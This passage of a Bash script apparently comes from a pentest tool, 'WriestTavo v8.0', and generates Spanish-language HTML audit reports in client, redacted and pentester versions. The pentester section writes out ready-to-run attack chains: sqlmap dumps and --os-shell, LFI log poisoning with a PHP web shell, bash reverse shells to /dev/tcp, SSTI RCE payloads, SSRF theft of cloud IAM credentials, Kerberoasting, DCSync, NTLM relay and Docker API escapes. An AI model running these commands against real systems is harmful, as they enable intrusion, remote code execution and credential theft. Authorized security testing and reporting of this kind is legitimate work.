          font-size:12px;display:flex;justify-content:space-between;align-items:center;}
  .footer a{color:#93c5fd;}
  @media(max-width:640px){.timeline{grid-template-columns:1fr;}.header{padding:24px;}}
</style>
</head>
<body>
<div class="header">
  <div class="header-logo">WriestTavo Security Audit v8.0</div>
  <h1>📋 Informe de Seguridad — Cliente IT</h1>
  <div class="header-meta">
    <span>🎯 Target: <b>${TARGET}</b></span>
    <span>📅 Fecha: <b>$(date '+%d/%m/%Y %H:%M')</b></span>
    <span>🏷️ Modo: <b>${SCAN_MODE}</b></span>
  </div>
</div>

<div class="container">

<!-- RIESGO GLOBAL -->
<div class="risk-banner">
  <div class="risk-icon">${risk_icon}</div>
  <div>
    <div class="risk-title">Nivel de Riesgo Global: ${risk_level}</div>
    <div class="risk-desc">Se encontraron <b>${crit} hallazgos críticos</b> y <b>${alto} altos</b> que requieren atención prioritaria. CVSS promedio del scan: <b>${avg_cvss}</b>.</div>
  </div>
</div>

<!-- ESTADÍSTICAS -->
<div class="stats-grid">
  <div class="stat-card stat-crit"><div class="stat-num">${crit}</div><div class="stat-label">Críticos</div></div>
  <div class="stat-card stat-high"><div class="stat-num">${alto}</div><div class="stat-label">Altos</div></div>
  <div class="stat-card stat-med"><div class="stat-num">${med}</div><div class="stat-label">Medios</div></div>
  <div class="stat-card stat-low"><div class="stat-num">${bajo}</div><div class="stat-label">Bajos</div></div>
  <div class="stat-card stat-cvss"><div class="stat-num">${avg_cvss}</div><div class="stat-label">CVSS Promedio</div></div>
</div>

<!-- PLAN DE ACCIÓN -->
<section>
  <h2>🗓️ Plan de Acción Priorizado</h2>
  <p class="section-desc">Organización de hallazgos según urgencia y ventana de remediación recomendada.</p>
  <div class="timeline">
    <div class="timeline-col t1">
      <h4>🔴 Acción Inmediata (0-48h)</h4>
      <ul>
$(for f in "${FINDINGS[@]}"; do
  sev=$(echo "$f"|awk -F'|||' '{print $1}')
  title=$(echo "$f"|awk -F'|||' '{print $2}')
  [[ "$sev" == "CRÍTICO" ]] && echo "        <li>${title}</li>"
done)
      </ul>
    </div>
    <div class="timeline-col t2">
      <h4>🟠 Próximo Sprint (1-2 semanas)</h4>
      <ul>
$(for f in "${FINDINGS[@]}"; do
  sev=$(echo "$f"|awk -F'|||' '{print $1}')
  title=$(echo "$f"|awk -F'|||' '{print $2}')
  [[ "$sev" == "ALTO" ]] && echo "        <li>${title}</li>"
done)
      </ul>
    </div>
    <div class="timeline-col t3">
      <h4>🟢 Backlog (30-90 días)</h4>
      <ul>
$(for f in "${FINDINGS[@]}"; do
  sev=$(echo "$f"|awk -F'|||' '{print $1}')
  title=$(echo "$f"|awk -F'|||' '{print $2}')
  [[ "$sev" == "MEDIO" || "$sev" == "BAJO" ]] && echo "        <li>${title}</li>"
done)
      </ul>
    </div>
  </div>
</section>

<!-- CONTEXTO TÉCNICO -->
<section>
  <h2>🔍 Contexto del Entorno Analizado</h2>
  <div class="intel-grid">
    $([ -n "$INTEL_OS" ]              && echo "<div class='intel-chip'><b>Sistema Operativo</b>${INTEL_OS}</div>")
    $([ -n "$INTEL_CMS" ]             && echo "<div class='intel-chip'><b>CMS Detectado</b>${INTEL_CMS}</div>")
    $([ -n "$INTEL_FRAMEWORK_BACKEND" ] && echo "<div class='intel-chip'><b>Framework Backend</b>${INTEL_FRAMEWORK_BACKEND}</div>")
    $([ -n "$INTEL_FRAMEWORK_JS" ]    && echo "<div class='intel-chip'><b>Framework Frontend</b>${INTEL_FRAMEWORK_JS}</div>")
    $([ -n "$INTEL_WAF_NAME" ]        && echo "<div class='intel-chip'><b>WAF / Firewall</b>${INTEL_WAF_NAME}</div>")
    $([ "${#INTEL_TECHNOLOGIES[@]}" -gt 0 ] && echo "<div class='intel-chip'><b>Tecnologías</b>${INTEL_TECHNOLOGIES[*]}</div>")
    $([ -n "$INTEL_CLOUD_PROVIDER" ]  && echo "<div class='intel-chip'><b>Cloud Provider</b>${INTEL_CLOUD_PROVIDER}</div>")
    $([ "${#INTEL_API_ENDPOINTS[@]}" -gt 0 ] && echo "<div class='intel-chip'><b>API Endpoints</b>${#INTEL_API_ENDPOINTS[@]} descubiertos</div>")
  </div>
</section>

<!-- PAYLOADS CONFIRMADOS -->
${payloads_section}

<!-- HALLAZGOS DETALLADOS -->
<section>
  <h2>📌 Hallazgos Detallados</h2>
  <p class="section-desc">Cada hallazgo incluye impacto de negocio y recomendación de remediación.</p>
  ${findings_html}
</section>

</div>
<div class="footer">
  <span>WriestTavo v8.0 · Auditoría de Seguridad</span>
  <span>Target: ${TARGET} · $(date '+%d/%m/%Y') · Confidencial</span>
</div>
</body></html>
CLIENTHTML

    ok "Reporte Cliente IT → ${REPORT_CLIENT}"
}

# ════════════════════════════════════════════════════════════════
# REPORTE 2: CENSURADO (Privacidad / Compliance / Legal)
# ════════════════════════════════════════════════════════════════
generar_reporte_censurado() {
    log "Generando Reporte 2: Versión Censurada..."
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    REPORT_CENSORED="${OUTPUT_DIR}/reporte_CENSURADO_${ts}.html"

    # Función de censura
    _censor() {
        local text="$1"
        # Censurar IPs
        text=$(echo "$text" | sed -E 's/([0-9]{1,3}\.){3}[0-9]{1,3}/[IP CENSURADA]/g')
        # Censurar dominios/URLs
        text=$(echo "$text" | sed -E 's|https?://[a-zA-Z0-9._/-]+|[URL CENSURADA]|g')
        # Censurar paths de archivo
        text=$(echo "$text" | sed -E 's|(/[a-zA-Z0-9._-]+){2,}|[RUTA CENSURADA]|g')
        # Censurar usuarios (patrones comunes)
        text=$(echo "$text" | sed -E 's/(user|usuario|admin|username)[=:][^\s<&]+/\1=[USUARIO CENSURADO]/gi')
        # Censurar passwords
        text=$(echo "$text" | sed -E 's/(pass(word)?|pwd|clave|contraseña)[=:][^\s<&]+/\1=[CONTRASEÑA CENSURADA]/gi')
        # Censurar tokens/hashes
        text=$(echo "$text" | sed -E 's/eyJ[a-zA-Z0-9._-]{20,}/[TOKEN JWT CENSURADO]/g')
        text=$(echo "$text" | sed -E 's/[A-Fa-f0-9]{32,}([^a-zA-Z0-9]|$)/[HASH CENSURADO]\1/g')
        # Remover bloques de código con comandos de explotación
        text=$(echo "$text" | sed -E 's/<code>[^<]{0,500}<\/code>/[COMANDO TÉCNICO OMITIDO]/g')
        text=$(echo "$text" | sed -E 's/<pre>[^<]{0,2000}<\/pre>/[SALIDA TÉCNICA OMITIDA]/g')
        echo "$text"
    }

    # Conteos
    local crit=0 alto=0 med=0 bajo=0 info_c=0
    for f in "${FINDINGS[@]}"; do
        case $(echo "$f"|awk -F'|||' '{print $1}') in
            CRÍTICO) ((crit++)) ;;  ALTO) ((alto++)) ;;
            MEDIO)   ((med++))  ;;  BAJO) ((bajo++)) ;;
            *)       ((info_c++)) ;;
        esac
    done

    local findings_censored=""
    for finding in "${FINDINGS[@]}"; do
        local sev title detail cvss rem
        sev=$(echo    "$finding" | awk -F'|||' '{print $1}')
        title=$(echo  "$finding" | awk -F'|||' '{print $2}')
        detail=$(echo "$finding" | awk -F'|||' '{print $3}')
        cvss=$(echo   "$finding" | awk -F'|||' '{print $4}')
        rem=$(echo    "$finding" | awk -F'|||' '{print $5}')

        [[ "$sev" == "INFO" ]] && continue

        local color="#5bc0de"
        case "$sev" in CRÍTICO) color="#dc2626" ;; ALTO) color="#ea580c" ;;
                        MEDIO)   color="#d97706" ;; BAJO) color="#16a34a" ;; esac

        # Censura AGRESIVA — solo el tipo de vulnerabilidad, no detalles
        local censored_title
        censored_title=$(echo "$title" | sed -E 's/ en [^ ]+$/ en [SISTEMA CENSURADO]/' \
            | sed -E 's/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[IP]/')
        local censored_detail
        censored_detail=$(_censor "${detail:0:300}")
        local censored_rem
        censored_rem=$(_censor "$rem")

        findings_censored+="<tr>"
        findings_censored+="<td><span class='sev' style='background:${color};'>${sev}</span></td>"
        findings_censored+="<td>${censored_title}</td>"
        findings_censored+="<td>${cvss}</td>"
        findings_censored+="<td style='color:#6b7280;font-size:12px;'>${censored_detail}</td>"
        findings_censored+="<td style='font-size:12px;'>${censored_rem}</td>"
        findings_censored+="</tr>"
    done

    cat > "$REPORT_CENSORED" << CENSORHTML
<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8">
<title>Informe de Seguridad — Versión Censurada</title>
<style>
  body{font-family:'Segoe UI',system-ui,sans-serif;background:#f9fafb;color:#111827;margin:0;}
  .header{background:#111827;color:#fff;padding:32px 48px;}
  .header h1{font-size:24px;font-weight:700;margin-bottom:4px;}
  .header .subtitle{font-size:13px;color:#9ca3af;}
  .confidential-banner{background:#fef3c7;border:2px solid #f59e0b;padding:14px 48px;
    display:flex;align-items:center;gap:12px;font-weight:600;color:#92400e;font-size:14px;}
  .privacy-note{background:#eff6ff;border:1px solid #bfdbfe;margin:20px 40px;padding:16px 24px;
    border-radius:8px;font-size:13px;color:#1e40af;}
  .container{max-width:1100px;margin:0 auto;padding:24px 40px;}
  .stats-row{display:flex;gap:12px;margin-bottom:28px;flex-wrap:wrap;}
  .stat{background:#fff;border:1px solid #e5e7eb;border-radius:8px;padding:16px 20px;
    text-align:center;min-width:100px;}
  .stat-n{font-size:28px;font-weight:800;}
  .stat-l{font-size:11px;color:#6b7280;text-transform:uppercase;margin-top:4px;}
  .redacted{background:#374151;color:#374151;border-radius:3px;user-select:none;
    cursor:not-allowed;padding:0 6px;}
  .redacted::after{content:'████';color:#374151;}
  .censored-note{font-size:11px;color:#9ca3af;font-style:italic;}
  table{width:100%;border-collapse:collapse;background:#fff;border-radius:8px;
    overflow:hidden;box-shadow:0 1px 3px rgba(0,0,0,.1);}
  th{background:#f3f4f6;padding:12px 16px;text-align:left;font-size:12px;
    font-weight:600;text-transform:uppercase;letter-spacing:.5px;color:#6b7280;}
  td{padding:12px 16px;border-bottom:1px solid #f3f4f6;vertical-align:top;font-size:13px;}
  tr:last-child td{border-bottom:none;}
  .sev{font-size:10px;font-weight:700;color:#fff;padding:2px 8px;
    border-radius:4px;text-transform:uppercase;}
  .vuln-type-tag{display:inline-block;background:#f3f4f6;border:1px solid #e5e7eb;
    border-radius:4px;padding:2px 8px;font-size:11px;color:#374151;}
  .section-title{font-size:17px;font-weight:700;margin:28px 0 14px;
    padding-bottom:8px;border-bottom:2px solid #e5e7eb;}
  .disclaimer{background:#f9fafb;border:1px solid #e5e7eb;padding:16px 24px;
    border-radius:8px;font-size:12px;color:#6b7280;margin-top:28px;}
  .footer{background:#111827;color:#6b7280;padding:16px 48px;
    font-size:12px;text-align:center;margin-top:40px;}
</style>
</head><body>
<div class="header">
  <h1>🔒 Informe de Seguridad — Versión Censurada</h1>
  <div class="subtitle">Documento de distribución controlada · Datos sensibles omitidos por política de privacidad</div>
</div>

<div class="confidential-banner">
  ⚠️ CONFIDENCIAL — DISTRIBUCIÓN RESTRINGIDA &nbsp;|&nbsp;
  Este documento ha sido procesado para remover información técnica sensible, rutas de explotación y datos de infraestructura.
</div>

<div class="privacy-note">
  <b>📋 Nota de Privacidad:</b> Este informe ha sido editado para cumplir con políticas internas de privacidad y protección de datos.
  Las IPs, URLs específicas, credenciales, hashes, tokens, rutas del sistema y comandos de explotación han sido
  reemplazados por <span class="redacted"></span>. Para el informe técnico completo, solicitar al equipo de seguridad con las autorizaciones correspondientes.
</div>

<div class="container">
  <p style="font-size:13px;color:#6b7280;margin-bottom:20px;">
    <b>Objetivo auditado:</b> <span class="redacted"></span> &nbsp;|&nbsp;
    <b>Fecha:</b> $(date '+%d/%m/%Y') &nbsp;|&nbsp;
    <b>Tipo:</b> Auditoría de Seguridad Web / Infraestructura
  </p>

  <div class="stats-row">
    <div class="stat"><div class="stat-n" style="color:#dc2626;">${crit}</div><div class="stat-l">Críticos</div></div>
    <div class="stat"><div class="stat-n" style="color:#ea580c;">${alto}</div><div class="stat-l">Altos</div></div>
    <div class="stat"><div class="stat-n" style="color:#d97706;">${med}</div><div class="stat-l">Medios</div></div>
    <div class="stat"><div class="stat-n" style="color:#16a34a;">${bajo}</div><div class="stat-l">Bajos</div></div>
    <div class="stat"><div class="stat-n" style="color:#6b7280;">${info_c}</div><div class="stat-l">Info</div></div>
  </div>

  <div class="section-title">📋 Resumen de Vulnerabilidades (Censurado)</div>
  <table>
    <thead><tr>
      <th>Severidad</th><th>Tipo de Vulnerabilidad</th>
      <th>CVSS</th><th>Descripción General</th><th>Remediación</th>
    </tr></thead>
    <tbody>${findings_censored}</tbody>
  </table>

  $(if (( ${#EFFECTIVE_PAYLOADS[@]} > 0 )); then
    echo "<div class='section-title'>⚠ Técnicas de Ataque Detectadas (Sin Detalles)</div>"
    echo "<table><thead><tr><th>Categoría</th><th>Estado</th><th>Nota</th></tr></thead><tbody>"
    echo "$INTEL_SQLI_FOUND"  == "true" && echo "<tr><td>SQL Injection</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Parámetros afectados omitidos por política de privacidad.</td></tr>"
    echo "$INTEL_XSS_FOUND"   == "true" && echo "<tr><td>Cross-Site Scripting</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Puntos de inyección omitidos.</td></tr>"
    echo "$INTEL_LFI_FOUND"   == "true" && echo "<tr><td>Local File Inclusion</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Rutas accedidas omitidas.</td></tr>"
    echo "$INTEL_SSRF_FOUND"  == "true" && echo "<tr><td>SSRF</td><td><span class='sev' style='background:#dc2626;'>CONFIRMADO</span></td><td>Endpoints internos alcanzados omitidos.</td></tr>"
    echo "</tbody></table>"
  fi)

  <div class="disclaimer">
    <b>Descargo de responsabilidad:</b> Este documento ha sido generado automáticamente por WriestTavo v8.0 y posteriormente
    procesado para eliminar información sensible. El equipo de seguridad conserva el informe técnico completo.
    Este documento es válido únicamente como resumen para terceros autorizados y no reemplaza al informe técnico original.
    Las vulnerabilidades listadas fueron identificadas durante la ventana de auditoría autorizada. No reproducir ni distribuir sin autorización.
  </div>
</div>
<div class="footer">WriestTavo Security Audit v8.0 · Informe Censurado · $(date '+%d/%m/%Y')</div>
</body></html>
CENSORHTML

    ok "Reporte Censurado → ${REPORT_CENSORED}"
}

# ════════════════════════════════════════════════════════════════
# REPORTE 3: PENTESTER — TÉCNICO COMPLETO
# ════════════════════════════════════════════════════════════════
generar_reporte_pentester() {
    log "Generando Reporte 3: Pentester Técnico..."
    local ts
    ts=$(date +"%Y%m%d_%H%M%S")
    REPORT_PENTESTER="${OUTPUT_DIR}/reporte_PENTESTER_${TARGET//[^a-zA-Z0-9]/_}_${ts}.html"

    # Construir rutas de ataque sugeridas según INTEL
    local attack_chains=""

    # Chain 1: SQLi → DB dump
    if [[ "$INTEL_SQLI_FOUND" == "true" ]]; then
        local db_type="${INTEL_TECHNOLOGIES[*]}"
        local tamper_flag=""
        [[ "$INTEL_WAF_DETECTED" == "true" ]] && tamper_flag="--tamper=between,charencode,space2comment --level=5 --risk=3"
        attack_chains+="
        <div class='chain critical'>
          <div class='chain-header'>💉 SQLi → Database Dump → Credenciales</div>
          <div class='chain-steps'>
            <div class='step'>
              <div class='step-num'>1</div>
              <div class='step-body'>
                <b>Confirmar con sqlmap</b>
                <code>sqlmap -u \"URL_VULNERABLE?param=1\" --dbs --batch ${tamper_flag}</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>2</div>
              <div class='step-body'>
                <b>Dump tabla de usuarios</b>
                <code>sqlmap -u \"URL_VULNERABLE\" -D DB_NAME -T users --dump --batch</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>3</div>
              <div class='step-body'>
                <b>Crackear hashes con hashcat</b>
                <code>hashcat -m 0 hashes.txt rockyou.txt --force</code>
                <code>hashcat -m 3200 bcrypt_hashes.txt rockyou.txt -O</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>4</div>
              <div class='step-body'>
                <b>Si MySQL con FILE privilege → RCE</b>
                <code>sqlmap -u \"URL\" --os-shell --batch</code>
              </div>
            </div>
          </div>
        </div>"
    fi

    # Chain 2: LFI → Log Poisoning → RCE
    if [[ "$INTEL_LFI_FOUND" == "true" ]]; then
        attack_chains+="
        <div class='chain critical'>
          <div class='chain-header'>📂 LFI → Log Poisoning → RCE</div>
          <div class='chain-steps'>
            <div class='step'>
              <div class='step-num'>1</div>
              <div class='step-body'>
                <b>Confirmar LFI en parámetro detectado</b>
                <code>curl -k \"${INTEL_LFI_URL:-TARGET}?${INTEL_LFI_PARAM:-file}=../../../etc/passwd\"</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>2</div>
              <div class='step-body'>
                <b>PHP Wrapper — leer código fuente</b>
                <code>curl -k \"URL?param=php://filter/convert.base64-encode/resource=index.php\" | base64 -d</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>3</div>
              <div class='step-body'>
                <b>Log Poisoning via User-Agent</b>
                <code>curl -k -A '&lt;?php system(\$_GET[\"cmd\"]); ?&gt;' TARGET</code>
                <code>curl -k \"URL?param=/var/log/apache2/access.log&cmd=id\"</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>4</div>
              <div class='step-body'>
                <b>Reverse shell desde RCE</b>
                <code>curl -k \"URL?param=/var/log/nginx/access.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/TU_IP/4444+0>%261'\"</code>
              </div>
            </div>
          </div>
        </div>"
    fi

    # Chain 3: SSRF → Cloud Metadata
    if [[ "$INTEL_SSRF_FOUND" == "true" ]]; then
        local meta_url="http://169.254.169.254/latest/meta-data/"
        [[ "$INTEL_CLOUD_PROVIDER" == "gcp"   ]] && meta_url="http://metadata.google.internal/computeMetadata/v1/"
        [[ "$INTEL_CLOUD_PROVIDER" == "azure" ]] && meta_url="http://169.254.169.254/metadata/instance"
        attack_chains+="
        <div class='chain critical'>
          <div class='chain-header'>🌐 SSRF → Cloud Metadata → Credenciales AWS/GCP/Azure</div>
          <div class='chain-steps'>
            <div class='step'>
              <div class='step-num'>1</div>
              <div class='step-body'>
                <b>Acceder a metadata (${INTEL_CLOUD_PROVIDER:-cloud})</b>
                <code>curl -k \"${INTEL_SSRF_URL:-TARGET}?url=${meta_url}\"</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>2</div>
              <div class='step-body'>
                <b>Obtener IAM credentials (AWS)</b>
                <code>curl -k \"URL?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME\"</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>3</div>
              <div class='step-body'>
                <b>Usar credenciales con AWS CLI</b>
                <code>export AWS_ACCESS_KEY_ID=KEY; export AWS_SECRET_ACCESS_KEY=SECRET; export AWS_SESSION_TOKEN=TOKEN</code>
                <code>aws sts get-caller-identity; aws s3 ls; aws ec2 describe-instances</code>
              </div>
            </div>
          </div>
        </div>"
    fi

    # Chain 4: SSTI → RCE
    if [[ "$INTEL_SSTI_FOUND" == "true" ]]; then
        local ssti_payload='{{config.__class__.__init__.__globals__["os"].popen("id").read()}}'
        [[ "$INTEL_FRAMEWORK_BACKEND" == "twig" || "$INTEL_CMS" == "drupal" ]] && \
            ssti_payload='{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}'
        attack_chains+="
        <div class='chain critical'>
          <div class='chain-header'>🧩 SSTI → RCE (${INTEL_FRAMEWORK_BACKEND:-engine detectado})</div>
          <div class='chain-steps'>
            <div class='step'>
              <div class='step-num'>1</div>
              <div class='step-body'>
                <b>Confirmar motor de templates</b>
                <code>{{7*7}} → 49 (Jinja2/Twig) | #{7*7} → 49 (Ruby ERB) | \${7*7} → 49 (Freemarker)</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>2</div>
              <div class='step-body'>
                <b>Payload RCE — ${INTEL_FRAMEWORK_BACKEND:-Jinja2}</b>
                <code>${ssti_payload}</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>3</div>
              <div class='step-body'>
                <b>Reverse shell</b>
                <code>{{config.__class__.__init__.__globals__["os"].popen("bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'").read()}}</code>
              </div>
            </div>
          </div>
        </div>"
    fi

    # Chain 5: AD Kerberoasting
    if (( ${#AD_KERBEROASTABLE[@]} > 0 )); then
        attack_chains+="
        <div class='chain critical'>
          <div class='chain-header'>🏢 Kerberoasting → DA (${#AD_KERBEROASTABLE[@]} cuentas)</div>
          <div class='chain-steps'>
            <div class='step'>
              <div class='step-num'>1</div>
              <div class='step-body'>
                <b>Obtener TGS hashes</b>
                <code>impacket-GetUserSPNs '${AD_DOMAIN_FQDN}/${AD_USER}:${AD_PASS}' -dc-ip ${AD_DC_IP} -request -outputfile ${OUTPUT_DIR}/kerberoast.hashes</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>2</div>
              <div class='step-body'>
                <b>Crackear con hashcat</b>
                <code>hashcat -m 13100 ${OUTPUT_DIR}/kerberoast.hashes /usr/share/wordlists/rockyou.txt --force</code>
                <code>hashcat -m 13100 ${OUTPUT_DIR}/kerberoast.hashes /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -r /usr/share/hashcat/rules/best64.rule</code>
              </div>
            </div>
            <div class='step'>
              <div class='step-num'>3</div>
              <div class='step-body'>
                <b>Pass-the-Hash / Pass-the-Ticket si se crackea</b>
                <code>impacket-psexec DOMAIN/SERVICE_ACCOUNT@${AD_DC_IP}</code>
                <code>impacket-secretsdump DOMAIN/SERVICE_ACCOUNT@${AD_DC_IP} -just-dc-ntlm</code>
              </div>
            </div>
          </div>
        </div>"
    fi

    # Construir todos los hallazgos técnicos COMPLETOS
    local all_findings_html=""
    local prev_sev=""
    for finding in "${FINDINGS[@]}"; do
        local sev title detail cvss rem next_step
        sev=$(echo       "$finding" | awk -F'|||' '{print $1}')
        title=$(echo     "$finding" | awk -F'|||' '{print $2}')
        detail=$(echo    "$finding" | awk -F'|||' '{print $3}')
        cvss=$(echo      "$finding" | awk -F'|||' '{print $4}')
        rem=$(echo       "$finding" | awk -F'|||' '{print $5}')
        next_step=$(echo "$finding" | awk -F'|||' '{print $6}')

        if [[ "$sev" != "$prev_sev" ]]; then
            [[ -n "$prev_sev" ]] && all_findings_html+="</div>"
            all_findings_html+="<div class='sev-group'>"
            all_findings_html+="<div class='sev-group-header sev-${sev,,}'>${sev}</div>"
            prev_sev="$sev"
        fi

        local border_color="#444"
        case "$sev" in
            CRÍTICO) border_color="#ff2d2d" ;;
            ALTO)    border_color="#ff6b35" ;;
            MEDIO)   border_color="#ffd23f" ;;
            BAJO)    border_color="#57cc99" ;;
            INFO)    border_color="#58a6ff" ;;
        esac

        all_findings_html+="<div class='finding' style='border-left:3px solid ${border_color};'>"
        all_findings_html+="<div class='f-title'>"
        all_findings_html+="<span class='f-sev' style='background:${border_color};'>${sev}</span>"
        all_findings_html+="<span class='f-name'>${title}</span>"
        [[ -n "$cvss" && "$cvss" != "N/A" ]] && \
            all_findings_html+="<span class='cvss-tag' style='border-color:${border_color};color:${border_color};'>CVSS ${cvss}</span>"
        all_findings_html+="</div>"
        all_findings_html+="<div class='f-detail'>${detail}</div>"
        [[ -n "$rem" ]] && all_findings_html+="<div class='f-rem'><span class='label'>🔧 Remediación</span>${rem}</div>"
        [[ -n "$next_step" ]] && all_findings_html+="<div class='f-next'><span class='label'>⚡ Next Step</span><code>${next_step}</code></div>"
        all_findings_html+="</div>"
    done
    [[ -n "$prev_sev" ]] && all_findings_html+="</div>"

    # Tips para exploración manual
    local manual_tips=""
    [[ -n "$INTEL_GRAPHQL_URL" ]] && manual_tips+="
    <div class='tip'>
      <div class='tip-title'>🔍 GraphQL Introspection</div>
      <code>curl -k -X POST '${INTEL_GRAPHQL_URL}' -H 'Content-Type: application/json' -d '{\"query\":\"{__schema{types{name fields{name}}}}\"}' | python3 -m json.tool</code>
      <code>graphw00f -t ${TARGET} -f  # Fingerprinting del engine</code>
      <code>clairvoyance ${INTEL_GRAPHQL_URL}  # Fuerza bruta de schema</code>
    </div>"

    [[ -n "$INTEL_SWAGGER_URL" ]] && manual_tips+="
    <div class='tip'>
      <div class='tip-title'>📖 Swagger/OpenAPI Fuzzing</div>
      <code>curl -k '${INTEL_SWAGGER_URL}' | python3 -m json.tool > swagger.json</code>
      <code>python3 swagger-codegen.py swagger.json  # Generar tests automáticos</code>
      <code>arjun --openapi swagger.json -u ${TARGET}  # Probar parámetros</code>
    </div>"

    [[ "$INTEL_DOCKER_EXPOSED" == "true" ]] && manual_tips+="
    <div class='tip'>
      <div class='tip-title'>🐋 Docker API → RCE</div>
      <code>docker -H tcp://${TARGET}:2375 ps  # Ver contenedores</code>
      <code>docker -H tcp://${TARGET}:2375 run -v /:/mnt alpine cat /mnt/etc/shadow  # LPE</code>
      <code>docker -H tcp://${TARGET}:2375 exec -it CONTAINER_ID /bin/sh  # Shell en contenedor</code>
    </div>"

    [[ "$INTEL_JWT_ALG_NONE" == "true" || -n "$INTEL_JWT_WEAK_SECRET" ]] && manual_tips+="
    <div class='tip'>
      <div class='tip-title'>🔑 JWT — Técnicas Avanzadas</div>
      <code>jwt_tool TOKEN -X a  # alg:none bypass</code>
      <code>jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt  # crack secret</code>
      <code>python3 -c \"import jwt; print(jwt.encode({'role':'admin','exp':9999999999},'${INTEL_JWT_WEAK_SECRET:-secret}',algorithm='HS256'))\"</code>
    </div>"

    [[ "$INTEL_CORS_VULN" == "true" ]] && manual_tips+="
    <div class='tip'>
      <div class='tip-title'>🌐 CORS → Robo de Datos</div>
      <code>curl -k -H 'Origin: https://evil.com' '${ORIGINAL_URL:-TARGET}/api/profile' -v 2>&1 | grep -i 'access-control'</code>
      <div>PoC HTML generado en: <b>${OUTPUT_DIR}/web/cors_poc.html</b></div>
    </div>"

    # AD tips adicionales
    [[ -n "$AD_DC_IP" ]] && manual_tips+="
    <div class='tip'>
      <div class='tip-title'>🏢 Active Directory — Próximos Pasos</div>
      <code>bloodhound-python -u ${AD_USER} -p '${AD_PASS}' -d ${AD_DOMAIN_FQDN} -ns ${AD_DC_IP} -c All --zip</code>
      <code>impacket-secretsdump ${AD_DOMAIN_FQDN}/${AD_USER}@${AD_DC_IP} -just-dc-ntlm  # DCSync si DA</code>
      <code>certipy find -u ${AD_USER}@${AD_DOMAIN_FQDN} -p '${AD_PASS}' -dc-ip ${AD_DC_IP} -vulnerable -stdout</code>
      <code>impacket-ntlmrelayx -smb2support -t ldaps://${AD_DC_IP} --add-computer  # NTLM Relay si SMB signing off</code>
    </div>"

    # Payloads efectivos documentados
    local confirmed_payload_html=""
    if (( ${#EFFECTIVE_PAYLOADS[@]} > 0 )); then
        confirmed_payload_html="<table class='payload-log'>"
        confirmed_payload_html+="<thead><tr><th>Tipo</th><th>Payload Efectivo</th><th>URL / Parámetro</th><th>Evidencia</th></tr></thead><tbody>"
        for ep in "${EFFECTIVE_PAYLOADS[@]}"; do
            local ep_tipo ep_payload ep_url ep_ev
            ep_tipo=$(echo "$ep"    | awk -F'|||' '{print $1}')
            ep_payload=$(echo "$ep" | awk -F'|||' '{print $2}')
            ep_url=$(echo "$ep"     | awk -F'|||' '{print $3}')
            ep_ev=$(echo "$ep"      | awk -F'|||' '{print $4}')
            confirmed_payload_html+="<tr>"
            confirmed_payload_html+="<td><span class='type-tag'>${ep_tipo}</span></td>"
            confirmed_payload_html+="<td><code class='p-code'>${ep_payload}</code></td>"
            confirmed_payload_html+="<td><code class='url-code'>${ep_url}</code></td>"
            confirmed_payload_html+="<td style='font-size:12px;'>${ep_ev}</td>"
            confirmed_payload_html+="</tr>"
        done
        confirmed_payload_html+="</tbody></table>"
    else
        confirmed_payload_html="<p style='color:#6b7280;font-size:13px;'>Sin payloads confirmados registrados — revisar hallazgos individuales para evidencia.</p>"
    fi

    cat > "$REPORT_PENTESTER" << PTHTML
<!DOCTYPE html><html lang="es"><head>
<meta charset="UTF-8">
<title>Reporte Pentester — ${TARGET}</title>
<style>
  :root{--bg:#0d1117;--bg2:#161b22;--bg3:#21262d;--txt:#c9d1d9;--txt2:#8b949e;
        --border:#30363d;--accent:#58a6ff;--red:#ff2d2d;--orange:#ff6b35;
        --yellow:#ffd23f;--green:#3fb950;--purple:#bc8cff;}
  *{box-sizing:border-box;margin:0;padding:0;}
  body{font-family:'Cascadia Code','Fira Code','JetBrains Mono',monospace;
       background:var(--bg);color:var(--txt);line-height:1.6;font-size:14px;}
  ::selection{background:#388bfd33;}
  .header{background:linear-gradient(180deg,#1c2128 0%,var(--bg) 100%);
          padding:32px 48px;border-bottom:1px solid var(--border);}
  .header-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:16px;}
  .header-badge{font-size:10px;letter-spacing:2px;text-transform:uppercase;
                color:var(--red);border:1px solid var(--red);padding:3px 10px;
                border-radius:4px;margin-bottom:12px;display:inline-block;}
  .header h1{font-size:22px;font-weight:700;color:#fff;margin-bottom:4px;}
  .header-meta{font-size:12px;color:var(--txt2);}
  .header-meta span{margin-right:20px;}
  .header-meta b{color:var(--accent);}
  .container{max-width:1200px;margin:0 auto;padding:28px 48px;}
  /* INTEL BOX */
  .intel-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:8px;margin-top:12px;}
  .intel-item{background:var(--bg2);border:1px solid var(--border);border-radius:6px;
              padding:10px 14px;font-size:12px;}
  .intel-label{color:var(--txt2);font-size:10px;text-transform:uppercase;
               letter-spacing:1px;display:block;margin-bottom:2px;}
  .intel-val{color:var(--accent);font-weight:600;}
  /* Sección */
  .section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;
           padding:24px;margin-bottom:20px;}
